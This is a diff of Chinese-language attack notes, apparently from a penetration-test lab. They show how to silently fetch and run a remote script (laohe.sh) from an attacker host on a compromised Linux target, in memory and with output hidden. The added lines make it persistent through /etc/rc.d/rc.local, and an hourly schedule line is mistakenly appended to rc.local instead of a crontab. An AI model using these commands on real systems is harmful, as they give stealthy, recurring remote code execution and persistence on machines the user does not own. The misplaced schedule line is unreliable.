@@ -16,9 +16,24 @@ laohe.sh这个脚本文件不需要添加权限
 rm -rf /tmp/Vegile-master.zip /tmp/Vegile-master
 
 ####靶机执行（8080那台机器拿到权限后，执行）
-bash <(curl -s -L http://0.211.55.6/laohe.sh) >> /dev/null 2>&1
+bash <(curl -s -L http://10.211.55.6/laohe.sh) >> /dev/null 2>&1
 -s 静默，不输出任何东西
 -L 跟http链接，下载到内存，不保存到磁盘
+
+
+###开机自启动
+给开机启动项加些内容
+/etc/rc.d/rc.local
+echo "bash <(curl -s -L http://10.211.55.6/laohe.sh) >> /dev/null 2>&1" >> /etc/rc.d/rc.local
+chmod +x /etc/rc.d/rc.local
+
+方法二：
+计划任务
+echo "0 */1 * * * root bash <(curl -s -L http://10.211.55.6/laohe.sh) >> /dev/null 2>&1" >> /etc/rc.d/rc.local
+每一小时建立一次连接
+
+
+
 
 
 
